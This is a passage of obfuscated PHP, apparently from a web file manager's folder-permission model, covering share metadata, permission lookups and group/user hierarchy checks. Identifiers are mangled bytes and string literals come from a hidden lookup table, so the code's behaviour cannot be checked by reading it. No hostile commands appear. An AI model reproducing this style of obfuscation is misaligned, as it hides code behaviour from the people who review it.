$í¶§íúÑ[$¾ûµ‘–€[830]] == $¾ûµ‘–€[2154]) { $»¥¦şÔ¿[$¾ûµ‘–€[830]] = 0; } $—ã”ğ¨ï = Model($¾ûµ‘–€[2149])->where($ÇéÙ—)->save($»¥¦şÔ¿); if ($äüô¡ÛŸ[$¾ûµ‘–€[830]] == $¾ûµ‘–€[521]) { if ($í¶§íúÑ[$¾ûµ‘–€[552]] != $¾ûµ‘–€[240] && $this->shareFileMeta($í¶§íúÑ[$¾ûµ‘–€[552]])) { $this->shareFileMeta($í¶§íúÑ[$¾ûµ‘–€[552]], 0); } $this->remove($í¶§íúÑ[$¾ûµ‘–€[679]]); return !0; } if ($—ã”ğ¨ï && $äüô¡ÛŸ[$¾ûµ‘–€[830]] == $¾ûµ‘–€[2154]) { $Ã¿·¯ò = $»¥¦şÔ¿[$¾ûµ‘–€[830]] == $¾ûµ‘–€[2154] ? 1 : 0; $this->shareFileMeta($í¶§íúÑ[$¾ûµ‘–€[552]], $Ã¿·¯ò); $this->removeByFile($í¶§íúÑ[$¾ûµ‘–€[552]]); } return $—ã”ğ¨ï; } private function removeByFile($½ìŠİ) { $£’Ó¨­ =& $_SERVER[±³—úê]; $©ïóÚÖÇ = Model($£’Ó¨­[905])->where(array($£’Ó¨­[552] => $½ìŠİ))->field($£’Ó¨­[193])->select(); $áòËáØ = array_to_keyvalue($©ïóÚÖÇ, $£’Ó¨­[12], $£’Ó¨­[193]); $‹Ğº‡¾í = array($£’Ó¨­[193] => array($£’Ó¨­[7], $áòËáØ), $£’Ó¨­[573] => 1); $©ïóÚÖÇ = $this->where($‹Ğº‡¾í)->field($£’Ó¨­[679])->select(); if (empty($©ïóÚÖÇ)) { return; } $‹ÎíÛêã = array_to_keyvalue($©ïóÚÖÇ, $£’Ó¨­[12], $£’Ó¨­[679]); $this->remove($‹ÎíÛêã); } private function shareFileMeta($¹àø‹™È, $³¥ËéÀæ = null) { $øˆ¤¸†Ü =& $_SERVER[±³—úê]; $¡†Î©›¹ = array($øˆ¤¸†Ü[552] => $¹àø‹™È, $øˆ¤¸†Ü[97] => $øˆ¤¸†Ü[2159]); if (is_null($³¥ËéÀæ)) { return Model($øˆ¤¸†Ü[2160])->where($¡†Î©›¹)->find(); } $¡†Î©›¹[$øˆ¤¸†Ü[461]] = $³¥ËéÀæ; Model($øˆ¤¸†Ü[2160])->add($¡†Î©›¹, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\162\143\145\x5f\141\165\x74\x68"; public function getAuth($Äİçıµ) { $À‚¤Çƒ¶ =& $_SERVER[±³—úê]; $áâÊ€ö = $this->sourceAuthSelect($Äİçıµ); $º›ÃÛĞé = array(); $‚°©Ø = array(); $½•„ë¶ô = 2 << 25; foreach ($áâÊ€ö as $êŞ£™) { $ÏßÙÉİ = Model($À‚¤Çƒ¶[582])->listData($êŞ£™[$À‚¤Çƒ¶[2083]]); if (!$ÏßÙÉİ) { continue; } $º›ÃÛĞé[] = $êŞ£™; $Ÿ„”‰Æ = 0; if ($êŞ£™[$À‚¤Çƒ¶[190]] == SourceModel::TYPE_GROUP) { $Ÿ„”‰Æ = $½•„ë¶ô * 2; } if ($êŞ£™[$À‚¤Çƒ¶[190]] == SourceModel::TYPE_USER) { $Ÿ„”‰Æ = $½•„ë¶ô; } if ($êŞ£™[$À‚¤Çƒ¶[190]] == SourceModel::TYPE_USER && $êŞ£™[$À‚¤Çƒ¶[580]] == $À‚¤Çƒ¶[240]) { $Ÿ„”‰Æ = 0; } $‚°©Ø[] = $ÏßÙÉİ[$À‚¤Çƒ¶[498]] + $Ÿ„”‰Æ; } array_multisort($‚°©Ø, SORT_DESC, $º›ÃÛĞé); return $º›ÃÛĞé; } public function sourceAuthSelect($ˆ…–¤·) { $€œñ—úÕ =& $_SERVER[±³—úê]; static $“äŒ°Î“ = array(); $ÏÚ²ä÷Œ = is_array($ˆ…–¤·) ? !1 : !0; if ($ÏÚ²ä÷Œ) { $ˆ…–¤· = array($ˆ…–¤·); } $‚ ±ûû = array(); foreach ($ˆ…–¤· as $Ëéæ„ò”) { if (isset($“äŒ°Î“[$Ëéæ„ò”])) { $‚ ±ûû[$Ëéæ„ò”] = $“äŒ°Î“[$Ëéæ„ò”]; } } if (count($‚ ±ûû) == count($ˆ…–¤·)) { return $ÏÚ²ä÷Œ ? $‚ ±ûû[$ˆ…–¤·[0]] : $‚ ±ûû; } $§î´“ï½ = $€œñ—úÕ[2161]; $‚¤è¡ = array($€œñ—úÕ[193] => array($€œñ—úÕ[7], $ˆ…–¤·)); $­“ŞÄ–÷ = $this->field($§î´“ï½)->order($€œñ—úÕ[486])->where($‚¤è¡)->select(); $“ÌĞ¶Ö§ = array_to_keyvalue_group($­“ŞÄ–÷, $€œñ—úÕ[193]); foreach ($ˆ…–¤· as $Ëéæ„ò”) { $“äŒ°Î“[$Ëéæ„ò”] = $“ÌĞ¶Ö§[$Ëéæ„ò”] ? $“ÌĞ¶Ö§[$Ëéæ„ò”] : array(); } if ($ÏÚ²ä÷Œ) { return $­“ŞÄ–÷; } return $“ÌĞ¶Ö§; } public function setAuth($Ë›‚üó×, $©ÜµÁûâ) { $ú¯§‡² =& $_SERVER[±³—úê]; $ÍÜÚ¥¤Ñ = Model($ú¯§‡²[1423])->sourceInfo($Ë›‚üó×); if (!$ÍÜÚ¥¤Ñ) { return !1; } if ($ÍÜÚ¥¤Ñ[$ú¯§‡²[190]] != SourceModel::TYPE_GROUP) { return !1; } $´€Êßçø = 1; $Ì¯”¹³î = $ÍÜÚ¥¤Ñ[$ú¯§‡²[580]]; if ($Ì¯”¹³î != $´€Êßçø) { $Ó˜¹­€’ = array($ú¯§‡²[1975] => $Ì¯”¹³î); $úÈÒÖ£ì = Model($ú¯§‡²[2069])->field($ú¯§‡²[1775])->where($Ó˜¹­€’)->select(); $úÈÒÖ£ì = array_to_keyvalue($úÈÒÖ£ì, $ú¯§‡²[12], $ú¯§‡²[1775]); } $‰³€õŠÛ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Üš’‹ãç = array(); foreach ($©ÜµÁûâ as $­¡÷ûÅÜ) { if (!in_array($­¡÷ûÅÜ[$ú¯§‡²[190]], $‰³€õŠÛ)) { show_json(LNG($ú¯§‡²[2162]), !1); } if ($Ì¯”¹³î != $´€Êßçø) { if ($­¡÷ûÅÜ[$ú¯§‡²[190]] == SourceModel::TYPE_GROUP) { } if ($­¡÷ûÅÜ[$ú¯§‡²[580]] != 0 && !in_array($­¡÷ûÅÜ[$ú¯§‡²[580]], $úÈÒÖ£ì)) { } } if ($­¡÷ûÅÜ[$ú¯§‡²[580]] == 0) { $­¡÷ûÅÜ[$ú¯§‡²[190]] = SourceModel::TYPE_USER; } $Üš’‹ãç[] = array($ú¯§‡²[193] => $Ë›‚üó×, $ú¯§‡²[190] => intval($­¡÷ûÅÜ[$ú¯§‡²[190]]), $ú¯§‡²[580] => intval($­¡÷ûÅÜ[$ú¯§‡²[580]]), $ú¯§‡²[2083] => intval($­¡÷ûÅÜ[$ú¯§‡²[2083]]) ? intval($­¡÷ûÅÜ[$ú¯§‡²[2083]]) : 0, $ú¯§‡²[2144] => intval($­¡÷ûÅÜ[$ú¯§‡²[2144]]) ? intval($­¡÷ûÅÜ[$ú¯§‡²[2144]]) : -1); } $this->where(array($ú¯§‡²[502] => $Ë›‚üó×))->delete(); $this->addAll($Üš’‹ãç); return !0; } public function authClear($óæÄ€Ö) { $ÕÙ¹½Ñ =& $_SERVER[±³—úê]; $¾ò˜á×ù = Model($ÕÙ¹½Ñ[1423])->sourceInfo($óæÄ€Ö); $õÉ³ãÉ = array($óæÄ€Ö); if ($¾ò˜á×ù[$ÕÙ¹½Ñ[496]] == $ÕÙ¹½Ñ[91]) { $Çş›ò„ = array($ÕÙ¹½Ñ[666] => array($ÕÙ¹½Ñ[626], $¾ò˜á×ù[$ÕÙ¹½Ñ[595]] . $óæÄ€Ö . $ÕÙ¹½Ñ[627])); $õÉ³ãÉ = Model($ÕÙ¹½Ñ[1423])->field($ÕÙ¹½Ñ[502])->where($Çş›ò„)->getField($ÕÙ¹½Ñ[193], !0); $õÉ³ãÉ[] = $óæÄ€Ö; } $this->where(array($ÕÙ¹½Ñ[502] => array($ÕÙ¹½Ñ[503], $õÉ³ãÉ)))->delete(); return !0; } public function getAllChildren($Æ”‰ƒÇó) { $‹¬ô‘¿ =& $_SERVER[±³—úê]; $¨¦Ñú²· = Model($‹¬ô‘¿[1423])->sourceInfo($Æ”‰ƒÇó); if ($¨¦Ñú²·[$‹¬ô‘¿[496]] != $‹¬ô‘¿[91]) { return $this->sourceListAuth(array($Æ”‰ƒÇó)); } if ($¨¦Ñú²·[$‹¬ô‘¿[190]] != SourceModel::TYPE_GROUP) { return array(); } $°—Â»™Ë = 1; $¾Ã¢†´÷ = array($Æ”‰ƒÇó); if ($¨¦Ñú²·[$‹¬ô‘¿[192]] == $‹¬ô‘¿[240] && $¨¦Ñú²·[$‹¬ô‘¿[580]] != $°—Â»™Ë) { $¾Ã¢†´÷ = $this->groupChidldAllRootSource($¨¦Ñú²·[$‹¬ô‘¿[580]]); } $åò¶Ô£ = $this->field($‹¬ô‘¿[193])->group($‹¬ô‘¿[193])->select(); $åò¶Ô£ = array_to_keyvalue($åò¶Ô£, $‹¬ô‘¿[12], $‹¬ô‘¿[193]); if (!$åò¶Ô£) { return array(); } $¬…ƒ…¥— = $‹¬ô‘¿[2163]; $Ú“´€œ¸ = array($‹¬ô‘¿[193] => array($‹¬ô‘¿[7], $åò¶Ô£), $‹¬ô‘¿[516] => $‹¬ô‘¿[240]); $™Óñúşî = Model($‹¬ô‘¿[905])->field($¬…ƒ…¥—)->where($Ú“´€œ¸)->select(); $½±ü„òĞ = array($Æ”‰ƒÇó); foreach ($™Óñúşî as $·ªüƒüæ) { foreach ($¾Ã¢†´÷ as $÷³Ã³ïÎ) { $Ë„ñˆï = $‹¬ô‘¿[50] . $÷³Ã³ïÎ . $‹¬ô‘¿[50]; $®»š„£Œ = $·ªüƒüæ[$‹¬ô‘¿[595]] . $·ªüƒüæ[$‹¬ô‘¿[193]] . $‹¬ô‘¿[50]; if (strstr($®»š„£Œ, $Ë„ñˆï)) { $½±ü„òĞ[] = $·ªüƒüæ[$‹¬ô‘¿[193]]; break; } } } return $this->sourceListAuth($½±ü„òĞ); } private function sourceListAuth($ÙÖ“¢°µ) { $áŒ­Ÿ‚™ =& $_SERVER[±³—úê]; $Ó™Ì¦Û = Model($áŒ­Ÿ‚™[1423])->sourceListInfo($ÙÖ“¢°µ, !0); $‚˜æİÇ§ = $this->sourceAuthSelect($ÙÖ“¢°µ); $•ÅãØ•¬ = array(); $µ‰²¬ƒ§ = array(); foreach ($Ó™Ì¦Û as $´»€ÌèË) { unset($´»€ÌèË[$áŒ­Ÿ‚™[540]]); unset($´»€ÌèË[$áŒ­Ÿ‚™[538]]); unset($´»€ÌèË[$áŒ­Ÿ‚™[498]]); unset($´»€ÌèË[$áŒ­Ÿ‚™[90]]); $¾®ÔÎ÷Î = $‚˜æİÇ§[$´»€ÌèË[$áŒ­Ÿ‚™[193]]]; if (!$¾®ÔÎ÷Î) { continue; } $´»€ÌèË[$áŒ­Ÿ‚™[2164]] = $this->authTargetInfo($¾®ÔÎ÷Î); $´»€ÌèË[$áŒ­Ÿ‚™[593]] = rtrim($´»€ÌèË[$áŒ­Ÿ‚™[599]], $áŒ­Ÿ‚™[8]) . $áŒ­Ÿ‚™[8] . ltrim($´»€ÌèË[$áŒ­Ÿ‚™[593]], $áŒ­Ÿ‚™[8]); $•ÅãØ•¬[] = $´»€ÌèË; $Ôïàôˆğ = count(explode($áŒ­Ÿ‚™[8], trim($´»€ÌèË[$áŒ­Ÿ‚™[593]], $áŒ­Ÿ‚™[8]))); $µ‰²¬ƒ§[] = $Ôïàôˆğ + ($´»€ÌèË[$áŒ­Ÿ‚™[33]] == $áŒ­Ÿ‚™[78] ? 0 : 1000); } array_multisort($µ‰²¬ƒ§, SORT_ASC, $•ÅãØ•¬); return $•ÅãØ•¬; } private function groupChidldAllRootSource($òíû¿ˆ) { $Õéâ¾¿ =& $_SERVER[±³—úê]; $ÑÛÃŸË¥ = Model($Õéâ¾¿[2165])->groupChildrenAll($òíû¿ˆ); $´ş¤íûˆ = array($Õéâ¾¿[192] => 0, $Õéâ¾¿[580] => array($Õéâ¾¿[7], $ÑÛÃŸË¥), $Õéâ¾¿[190] => SourceModel::TYPE_GROUP); $şü²¸—İ = Model($Õéâ¾¿[905])->field($Õéâ¾¿[193])->where($´ş¤íûˆ)->select(); $şü²¸—İ = array_to_keyvalue($şü²¸—İ, $Õéâ¾¿[12], $Õéâ¾¿[193]); return $şü²¸—İ; } private function authTargetInfo($îí¾Åã˜) { $®ü³²¡ =& $_SERVER[±³—úê]; $ßÛÕ„ûñ = array(); $×Òï‚â = array(); $©ÄæÜµÒ = 2 << 25; foreach ($îí¾Åã˜ as $øÙµ­ôÏ) { $é§°­“ = Model($®ü³²¡[582])->listData($øÙµ­ôÏ[$®ü³²¡[2083]]); if (!$é§°­“) { continue; } if ($øÙµ­ôÏ[$®ü³²¡[190]] == SourceModel::TYPE_USER) { $Ç¡††ó = Model($®ü³²¡[588])->getInfoSimpleOuter($øÙµ­ôÏ[$®ü³²¡[580]]); if ($Ç¡††ó[$®ü³²¡[1775]] == $®ü³²¡[1275]) { continue; } if ($Ç¡††ó[$®ü³²¡[1775]] == $®ü³²¡[240]) { $Ç¡††ó[$®ü³²¡[32]] = LNG($®ü³²¡[2166]); } } else { $Ç¡††ó = Model($®ü³²¡[596])->getInfoSimple($øÙµ­ôÏ[$®ü³²¡[580]]); } if (!$Ç¡††ó) { continue; } $Ç¡††ó[$®ü³²¡[551]] = $é§°­“; $ßÛÕ„ûñ[] = $Ç¡††ó; $ËÑ¶õôË = 0; if ($øÙµ­ôÏ[$®ü³²¡[190]] == SourceModel::TYPE_GROUP) { $ËÑ¶õôË = $©ÄæÜµÒ * 2; } if ($øÙµ­ôÏ[$®ü³²¡[190]] == SourceModel::TYPE_USER) { $ËÑ¶õôË = $©ÄæÜµÒ; } if ($øÙµ­ôÏ[$®ü³²¡[190]] == SourceModel::TYPE_USER && $øÙµ­ôÏ[$®ü³²¡[580]] == $®ü³²¡[240]) { $ËÑ¶õôË = 0; } $×Òï‚â[] = $é§°­“[$®ü³²¡[498]] + $ËÑ¶õôË; } array_multisort($×Òï‚â, SORT_DESC, $ßÛÕ„ûñ); return $ßÛÕ„ûñ; } public function getAllChildrenByUser($Äó®úô, $À‚œÈÆÈ) { $ñ£ÍÒÆ =& $_SERVER[±³—úê]; $«ß“ïŒÅ = Model($ñ£ÍÒÆ[608])->getInfo($À‚œÈÆÈ); if (!$À‚œÈÆÈ || !$Äó®úô || !$«ß“ïŒÅ) { return array(); } $ËÁß—ÃÌ = Model($ñ£ÍÒÆ[1423])->sourceInfo($Äó®úô); $Í­é²ê× = array(); $š×Úöûİ = 1; if ($ËÁß—ÃÌ[$ñ£ÍÒÆ[192]] == $ñ£ÍÒÆ[240] && $ËÁß—ÃÌ[$ñ£ÍÒÆ[580]] != $š×Úöûİ && $this->groupContainUser($ËÁß—ÃÌ[$ñ£ÍÒÆ[580]], $À‚œÈÆÈ)) { foreach ($«ß“ïŒÅ[$ñ£ÍÒÆ[2167]] as $„ÔÂÛãƒ) { $¡ˆ¦ë˜ = Model($ñ£ÍÒÆ[596])->getInfo($„ÔÂÛãƒ[$ñ£ÍÒÆ[1975]]); $“°“è÷Š = Model($ñ£ÍÒÆ[608])->getInfoSimpleOuter($À‚œÈÆÈ); $“°“è÷Š[$ñ£ÍÒÆ[551]] = $„ÔÂÛãƒ[$ñ£ÍÒÆ[498]]; if (Model($ñ£ÍÒÆ[582])->authCheckAction($„ÔÂÛãƒ[$ñ£ÍÒÆ[498]][$ñ£ÍÒÆ[498]], $ñ£ÍÒÆ[1996])) { continue; } $«Òº™î¶ = array($ñ£ÍÒÆ[32] => $ñ£ÍÒÆ[1295] . $¡ˆ¦ë˜[$ñ£ÍÒÆ[32]], $ñ£ÍÒÆ[193] => $¡ˆ¦ë˜[$ñ£ÍÒÆ[90]][$ñ£ÍÒÆ[193]], $ñ£ÍÒÆ[87] => KodIO::make($¡ˆ¦ë˜[$ñ£ÍÒÆ[90]][$ñ£ÍÒÆ[193]]), $ñ£ÍÒÆ[192] => $ñ£ÍÒÆ[240], $ñ£ÍÒÆ[190] => $ñ£ÍÒÆ[589], $ñ£ÍÒÆ[33] => $ñ£ÍÒÆ[630], $ñ£ÍÒÆ[593] => $¡ˆ¦ë˜[$ñ£ÍÒÆ[600]], $ñ£ÍÒÆ[1975] => $¡ˆ¦ë˜[$ñ£ÍÒÆ[1975]], $ñ£ÍÒÆ[597] => $¡ˆ¦ë˜[$ñ£ÍÒÆ[192]], $ñ£ÍÒÆ[2164] => array($“°“è÷Š)); $Í­é²ê×[$«Òº™î¶[$ñ£ÍÒÆ[193]]] = $«Òº™î¶; } } $Ğå¼Ÿ¢â = array(); $èúœçŞµ = $this->getAllChildren($Äó®úô); foreach ($èúœçŞµ as $²ŸÕïåŞ) { $à……÷Ù¹ = !1; foreach ($²ŸÕïåŞ[$ñ£ÍÒÆ[2164]] as $š€‘´õ¹) { if ($š€‘´õ¹[$ñ£ÍÒÆ[1775]]) { if ($š€‘´õ¹[$ñ£ÍÒÆ[1775]] == $À‚œÈÆÈ) { $à……÷Ù¹ = !0; break; } } if ($š€‘´õ¹[$ñ£ÍÒÆ[1975]]) { if ($this->groupContainUser($š€‘´õ¹[$ñ£ÍÒÆ[1975]], $À‚œÈÆÈ)) { $à……÷Ù¹ = !0; break; } } } if ($à……÷Ù¹) { $Ğå¼Ÿ¢â[] = $²ŸÕïåŞ; } $Îè½’Éš = $²ŸÕïåŞ[$ñ£ÍÒÆ[193]]; if (isset($Í­é²ê×[$Îè½’Éš])) { $²ŸÕïåŞ[$ñ£ÍÒÆ[2164]][] = $Í­é²ê×[$Îè½’Éš][0]; $Í­é²ê×[$Îè½’Éš] = !1; } } $Í­é²ê× = array_filter(array_values($Í­é²ê×)); $Ğå¼Ÿ¢â = array_merge($Í­é²ê×, $Ğå¼Ÿ¢â); return $Ğå¼Ÿ¢â; } public function setAllChildrenByUser($åñ ûæ¶, $Ä ± ¹‹, $„‘Ñ®¿æ) { $÷Ã£ª«ô =& $_SERVER[±³—úê]; $¿´íú¶ó = $this->getAllChildrenByUser($åñ ûæ¶, $Ä ± ¹‹); if (!$„‘Ñ®¿æ || !$¿´íú¶ó) { return !1; } foreach ($¿´íú¶ó as $Å¤Íü‰Ÿ) { $Ğ®æ¬‡• = array(); foreach ($Å¤Íü‰Ÿ[$÷Ã£ª«ô[2164]] as $İé­Š¥ü) { $ÖÎ§Á²å = $İé­Š¥ü[$÷Ã£ª«ô[551]]; $ğ«•ı³ğ = $İé­Š¥ü[$÷Ã£ª«ô[1775]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ØùÌûÂÍ = $İé­Š¥ü[$÷Ã£ª«ô[1775]] ? $İé­Š¥ü[$÷Ã£ª«ô[1775]] : $İé­Š¥ü[$÷Ã£ª«ô[1975]]; if ($İé­Š¥ü[$÷Ã£ª«ô[1775]] && $İé­Š¥ü[$÷Ã£ª«ô[1775]] == $Ä ± ¹‹) { continue; } $Ğ®æ¬‡•[] = array($÷Ã£ª«ô[193] => $Å¤Íü‰Ÿ[$÷Ã£ª«ô[193]], $÷Ã£ª«ô[190] => $ğ«•ı³ğ, $÷Ã£ª«ô[580] => intval($ØùÌûÂÍ), $÷Ã£ª«ô[2083] => isset($ÖÎ§Á²å[$÷Ã£ª«ô[486]]) ? intval($ÖÎ§Á²å[$÷Ã£ª«ô[486]]) : 0, $÷Ã£ª«ô[2144] => isset($ÖÎ§Á²å[$÷Ã£ª«ô[2144]]) ? intval($ÖÎ§Á²å[$÷Ã£ª«ô[2144]]) : -1); } $Ğ®æ¬‡•[] = array($÷Ã£ª«ô[193] => $Å¤Íü‰Ÿ[$÷Ã£ª«ô[193]], $÷Ã£ª«ô[190] => SourceModel::TYPE_USER, $÷Ã£ª«ô[580] => intval($Ä ± ¹‹), $÷Ã£ª«ô[2083] => intval($„‘Ñ®¿æ), $÷Ã£ª«ô[2144] => -1); $this->where(array($÷Ã£ª«ô[502] => $Å¤Íü‰Ÿ[$÷Ã£ª«ô[193]]))->delete(); $this->addAll($Ğ®æ¬‡•); } return !0; } public function get($Ò°üØÙ²) { $Ğû«ìïì = $this->getSourceList(array($Ò°üØÙ²), !0); return $Ğû«ìïì[0]; } public function getSourceList($ÍŞ‚®ÅÄ, $Ì’ĞÄÅ– = false, $Â€š¹£‰ = false) { $Ó‹ª² Ï =& $_SERVER[±³—úê]; if (!$ÍŞ‚®ÅÄ) { return array(); } $³ŒĞÄÊç = Model($Ó‹ª² Ï[1423]); if (!$Ì’ĞÄÅ– && count($ÍŞ‚®ÅÄ) == 1) { $Ì’ĞÄÅ– = array(); $Ì’ĞÄÅ–[$ÍŞ‚®ÅÄ[0]] = $³ŒĞÄÊç->sourceInfo($ÍŞ‚®ÅÄ[0]); } if (!$Ì’ĞÄÅ–) { $šÒæñ¥® = array($Ó‹ª² Ï[502] => array($Ó‹ª² Ï[503], $ÍŞ‚®ÅÄ)); $Ì’ĞÄÅ– = $³ŒĞÄÊç->field($Ó‹ª² Ï[2168])->where($šÒæñ¥®)->select(); $Ì’ĞÄÅ– = array_to_keyvalue($Ì’ĞÄÅ–, $Ó‹ª² Ï[193]); } $•‰°…Œ¸ = $ÍŞ‚®ÅÄ; foreach ($Ì’ĞÄÅ– as $’†‹š‹í => $ıï³¤ñ„) { $ô¢úîĞ = $³ŒĞÄÊç->parentLevelArray($ıï³¤ñ„[$Ó‹ª² Ï[595]]); $•‰°…Œ¸ = array_merge($•‰°…Œ¸, array($’†‹š‹í), array_reverse($ô¢úîĞ)); } $•‰°…Œ¸ = array_values(array_unique($•‰°…Œ¸)); if (!$•‰°…Œ¸) { return array(); } $íè¸ùø = $this->sourceAuthSelect($•‰°…Œ¸); $¥áååÖß = array(); foreach ($•‰°…Œ¸ as $Çö€š) { if (isset($íè¸ùø[$Çö€š])) { $¥áååÖß[$Çö€š] = $íè¸ùø[$Çö€š]; } } $ÅÄ‡ = $this->userIsRoot($Â€š¹£‰); $÷‡‚ = AuthModel::authAll(); $ì‡Ìè¯Ü = array($Ó‹ª² Ï[499] => $÷‡‚, $Ó‹ª² Ï[2169] => array($Ó‹ª² Ï[504] => 0, $Ó‹ª² Ï[1981] => $÷‡‚, $Ó‹ª² Ï[505] => LNG($Ó‹ª² Ï[2170]), $Ó‹ª² Ï[1998] => $Ó‹ª² Ï[2171])); $¨¬Üú¥ = array(); foreach ($Ì’ĞÄÅ– as $Çö€š => $«²éå§¤) { if ($ÅÄ‡ && $GLOBALS[$Ó‹ª² Ï[6]][$Ó‹ª² Ï[1994]]) { $¨¬Üú¥[$Çö€š] = $ì‡Ìè¯Ü; continue; } $¨¬Üú¥[$Çö€š] = $this->makeSourceAuth($«²éå§¤, $¥áååÖß, $Â€š¹£‰); } return $¨¬Üú¥; } public function authDeepCheck($¢¨†Âô, $¼Óâè = false) { $¾Ü¿ğ =& $_SERVER[±³—úê]; $¼Óâè = $¼Óâè ? $¼Óâè : USER_ID; $×ĞÂ¹” = $this->makeAuthDeep($¼Óâè); if (!in_array($¢¨†Âô, $×ĞÂ¹”[$¾Ü¿ğ[2172]])) { return !1; } $­ü—™Ê‚ = array(); foreach ($×ĞÂ¹”[$¾Ü¿ğ[2173]] as $Ø»³ˆÌó => $”£‹ş¨Ø) { if (!in_array($¢¨†Âô, $”£‹ş¨Ø)) { continue; } $­ü—™Ê‚[] = $Ø»³ˆÌó; } if (!$­ü—™Ê‚) { return !1; } $íÉ€úÁš = $­ü—™Ê‚ ? $­ü—™Ê‚[0] : $¢¨†Âô; return array($¾Ü¿ğ[499] => -1, $¾Ü¿ğ[551] => array($¾Ü¿ğ[504] => $¾Ü¿ğ[1275], $¾Ü¿ğ[1981] => $¾Ü¿ğ[240], $¾Ü¿ğ[505] => LNG($¾Ü¿ğ[2174]), $¾Ü¿ğ[1998] => $¾Ü¿ğ[2175]), $¾Ü¿ğ[2176] => LNG($¾Ü¿ğ[2177]), $¾Ü¿ğ[2178] => $this->sourceAuthInfo($íÉ€úÁš)); } protected function makeAuthDeep($ì·Ó›·• = false) { $¥†¾ãÑŞ =& $_SERVER[±³—úê]; static $ÊÏœ…± = array(); $ì·Ó›·• = $ì·Ó›·• ? $ì·Ó›·• : USER_ID; if (isset($ÊÏœ…±[$ì·Ó›·•])) { return $ÊÏœ…±[$ì·Ó›·•]; } $ÖŠöÖ†½ = Model($¥†¾ãÑŞ[2179])->listData(); $Ü†îòÜ = array(); foreach ($ÖŠöÖ†½ as $çÖ†Âêİ) { if ($çÖ†Âêİ[$¥†¾ãÑŞ[498]] == 0 && $çÖ†Âêİ[$¥†¾ãÑŞ[1997]] == $¥†¾ãÑŞ[91]) { $Ü†îòÜ[] = $çÖ†Âêİ[$¥†¾ãÑŞ[486]]; } } $ˆ–ğšâÖ = $this->userGroupParents($ì·Ó›·•); $Á’µ·Àê = array($¥†¾ãÑŞ[190] => SourceModel::TYPE_USER, $¥†¾ãÑŞ[580] => $ì·Ó›·•); if ($ˆ–ğšâÖ) { $Á’µ·Àê = array(array($¥†¾ãÑŞ[190] => SourceModel::TYPE_USER, $¥†¾ãÑŞ[580] => $ì·Ó›·•), array($¥†¾ãÑŞ[190] => SourceModel::TYPE_GROUP, $¥†¾ãÑŞ[580] => array($¥†¾ãÑŞ[503], $ˆ–ğšâÖ)), $¥†¾ãÑŞ[1079] => $¥†¾ãÑŞ[2077]); } $ôÕÖôƒë = $this->field($¥†¾ãÑŞ[2180])->where($Á’µ·Àê)->select(); $ÄŠÑ°¢Â = array(); $µÃ’ßïÈ = array_to_keyvalue_group($ôÕÖôƒë, $¥†¾ãÑŞ[193]); foreach ($µÃ’ßïÈ as $¡ïíşÒú => $„ƒ’ÏÈ•) { $ß³ö ­ = $this->authArrayCheck($„ƒ’ÏÈ•, $ì·Ó›·•); if ($ß³ö ­[$¥†¾ãÑŞ[499]] > 0) { $ÄŠÑ°¢Â[] = $¡ïíşÒú . $¥†¾ãÑŞ[12]; } } if ($ˆ–ğšâÖ) { $€Ö›×ˆº = Model($¥†¾ãÑŞ[596]); foreach ($ˆ–ğšâÖ as $Û°¯¡šö) { $œŸ€ëñ = $€Ö›×ˆº->getInfo($Û°¯¡šö); if (!$œŸ€ëñ || !is_array($œŸ€ëñ[$¥†¾ãÑŞ[90]])) { continue; } $ÄŠÑ°¢Â[] = $œŸ€ëñ[$¥†¾ãÑŞ[90]][$¥†¾ãÑŞ[193]]; } } $»ÁŸöëƒ = array(); $û‚›ğÂ = $ˆ–ğšâÖ; $ğ¤âóìÑ = Model($¥†¾ãÑŞ[1423]); $€Ö›×ˆº = Model($¥†¾ãÑŞ[596]); $†ó†Ê”¸ = array(); $Ã£üè®Î = array(); $²Ú¬¸ÖÜ = array(); $˜ÌØ³ = array(); if ($ÄŠÑ°¢Â) { $©ÚÉïã‚ = $ğ¤âóìÑ->where(array($¥†¾ãÑŞ[193] => array($¥†¾ãÑŞ[503], $ÄŠÑ°¢Â)))->select(); foreach ($©ÚÉïã‚ as $§Óª¯´È) { $åÅÒïÈ÷ = $ğ¤âóìÑ->parentLevelArray($§Óª¯´È[$¥†¾ãÑŞ[595]]); $»ÁŸöëƒ = array_merge($»ÁŸöëƒ, $åÅÒïÈ÷); $û‚›ğÂ[] = $§Óª¯´È[$¥†¾ãÑŞ[580]]; $†ó†Ê”¸[$§Óª¯´È[$¥†¾ãÑŞ[193]]] = $åÅÒïÈ÷; $Ã£üè®Î[$§Óª¯´È[$¥†¾ãÑŞ[193]]] = $§Óª¯´È[$¥†¾ãÑŞ[580]]; } } $û‚›ğÂ = array_values(array_unique($û‚›ğÂ)); $à§Ò§©‡ = $û‚›ğÂ; foreach ($à§Ò§©‡ as $Û°¯¡šö) { $œŸ€ëñ = $€Ö›×ˆº->getInfo($Û°¯¡šö); $åÅÒïÈ÷ = $ğ¤âóìÑ->parentLevelArray($œŸ€ëñ[$¥†¾ãÑŞ[595]]); $û‚›ğÂ = array_merge($û‚›ğÂ, $åÅÒïÈ÷); } $û‚›ğÂ = array_values(array_unique($û‚›ğÂ)); foreach ($û‚›ğÂ as $Û°¯¡šö) { $œŸ€ëñ = $€Ö›×ˆº->getInfo($Û°¯¡šö); $»ÁŸöëƒ[] = $œŸ€ëñ[$¥†¾ãÑŞ[90]][$¥†¾ãÑŞ[193]]; $²Ú¬¸ÖÜ[$Û°¯¡šö] = $œŸ€ëñ[$¥†¾ãÑŞ[90]][$¥†¾ãÑŞ[193]]; $˜ÌØ³[$Û°¯¡šö] = $ğ¤âóìÑ->parentLevelArray($œŸ€ëñ[$¥†¾ãÑŞ[595]]); } foreach ($†ó†Ê”¸ as $³ĞíÛŒ => $ŸÑ¯°Í¶) { $Í¡˜á÷Â = $Ã£üè®Î[$³ĞíÛŒ]; if (!$Í¡˜á÷Â || !$²Ú¬¸ÖÜ[$Í¡˜á÷Â]) { continue; } $¨†„ğù¢ = array(); foreach ($˜ÌØ³[$Í¡˜á÷Â] as $Û°¯¡šö) { $¨†„ğù¢[] = $²Ú¬¸ÖÜ[$Û°¯¡šö]; } $†ó†Ê”¸[$³ĞíÛŒ] = array_merge($¨†„ğù¢, $ŸÑ¯°Í¶); } $»ÁŸöëƒ = array_values(array_unique($»ÁŸöëƒ)); $Óßåçúï = array($¥†¾ãÑŞ[2172] => $»ÁŸöëƒ, 